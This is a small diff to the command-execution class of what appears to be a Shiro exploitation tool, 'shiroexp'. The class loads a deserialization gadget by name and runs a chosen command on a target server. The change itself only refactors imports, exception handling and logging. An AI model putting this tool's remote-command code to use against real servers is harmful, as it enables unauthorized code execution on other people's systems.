@@ -1,8 +1,10 @@
 package com.y5neko.shiroexp.payloads;
 
+import com.y5neko.shiroexp.misc.Log;
 import com.y5neko.shiroexp.misc.Tools;
+import com.y5neko.shiroexp.object.TargetOBJ;
 import com.y5neko.shiroexp.request.HttpRequest;
-import com.y5neko.shiroexp.request.ResponseOBJ;
+import com.y5neko.shiroexp.object.ResponseOBJ;
 
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
@@ -16,7 +18,7 @@ public class CommandExcute {
      * @param targetOBJ 请求对象
      * @param command 执行命令
      */
-    public static void commandExcute(TargetOBJ targetOBJ, String command) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
+    public static void commandExcute(TargetOBJ targetOBJ, String command) {
         try {
             // 获取payload
             Class<?> gadgetClass = Class.forName("com.y5neko.shiroexp.gadget." + targetOBJ.getGadget());
@@ -35,10 +37,10 @@ public class CommandExcute {
             System.out.println(result);
             System.out.println("----------");
         } catch (IndexOutOfBoundsException e) {
-            System.out.println("[" + Tools.color("EROR", "RED") + "] 无回显");
+            System.out.println(Log.buffer_logging("NULL", "无回显"));
         }
         catch (Exception e) {
-            System.out.println("[" + Tools.color("EROR", "RED") + "] " + e.getMessage());
+            System.out.println(Log.buffer_logging("EROR", e.getMessage()));
         }
     }
 }
